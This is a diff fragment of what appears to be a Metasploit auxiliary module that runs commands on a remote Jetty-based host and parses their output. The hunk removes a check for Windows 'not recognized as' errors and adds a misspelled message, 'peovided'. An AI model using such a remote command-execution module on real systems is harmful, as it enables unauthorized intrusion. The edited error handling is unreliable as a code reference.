@@ -58,8 +58,8 @@ class Metasploit3 < Msf::Auxiliary
       output = res.scan(/<pre>(.*?)<\/pre>/m)[1][0][12..-1].gsub("err&amp;gt;", "")
       if output.include? "org.eclipse.jetty.server." and try == 1
         run_host(ip, "", 2)
-      elsif (output.include? "org.eclipse.jetty.server." and try == 2) or output.include? "not recognized as"
-        print_error("The provided command is not valid. Try again.")
+      elsif output.include? "org.eclipse.jetty.server." and try == 2
+        print_error("The peovided command is not valid. Try again.")
       else
         print_good("The command executed. Output:")
         print_good(output)
